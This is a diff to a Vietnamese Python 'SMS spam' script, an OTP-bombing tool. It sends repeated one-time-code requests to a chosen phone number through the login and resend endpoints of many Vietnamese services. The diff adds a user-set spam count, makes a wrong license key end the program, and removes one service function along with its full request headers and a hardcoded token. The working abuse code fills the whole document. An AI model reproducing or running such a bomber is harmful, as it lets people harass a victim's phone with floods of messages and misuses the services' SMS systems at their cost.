@@ -100,7 +100,9 @@ keynhap = Write.Input("=> Enter Key: ", Colors.red_to_yellow, interval=0.005)
 if keynhap == key:
     print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> Key Đúng"""))
     time.sleep(2)
-else: print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> Key Sai"""))
+else: 
+        print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> Key Sai"""))
+        quit()
 # [ Banner ]  
 def Banner():
     os.system("cls" if os.name == "nt" else "clear")
@@ -264,15 +266,6 @@ def winmart(phone):
     else:
         print(Colorate.Diagonal(Colors.red_to_yellow, f"""[x] WINMART: THẤT BẠI!"""))
 
-def moneydong(phone):
-    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
-    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
-    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
-    if response.status_code == 200:
-        print(Colorate.Diagonal(Colors.red_to_yellow, f"""[*] MONEYDONG: THÀNH CÔNG!"""))
-    else:
-        print(Colorate.Diagonal(Colors.red_to_yellow, f"""[x] MONEYDONG: THẤT BẠI!"""))
-
 def daihocfpt(phone):
     response = requests.get(f"https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={phone}")
     if response.status_code == 200:
@@ -357,10 +350,11 @@ def Main():
                 break
             else:
                 print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> SỐ ĐIỆN THOẠI PHẢI = 10 SỐ!"""))
-                
-    while True:
-        print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> BẮT ĐẦU SPAM"""))
-        oldvayvnd(phone)
+    a=int(input("Nhập Số Lần Spam: "))
+    i=1         
+    while i<a+1:
+        print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> SPAM LẦN: {i}"""))
+        i=i+1
         oldpops(phone)
         oldtv360(phone)
         oldloship(phone)
@@ -368,21 +362,21 @@ def Main():
         oldfptshop(phone)
         oldfacebook(phone)
         oldzalopay(phone)
-        oldtamo(phone)
-        oldsenmo(phone)
         vieon(phone)
         ahamove(phone)
         concung(phone)
         vietid(phone)
-        thantaioi(phone)
         fptplay(phone)
         funring(phone)
         gotadi(phone)
         winmart(phone)
-        moneydong(phone)
+        #moneydong(phone)
         daihocfpt(phone)
         cafeland(phone)
+        oldvayvnd(phone)
+        oldtamo(phone)
+        oldsenmo(phone)
+        thantaioi(phone)
         atmonline(phone)
         print(Colorate.Diagonal(Colors.red_to_yellow, f"""=> DONE! """))
 Main()
-
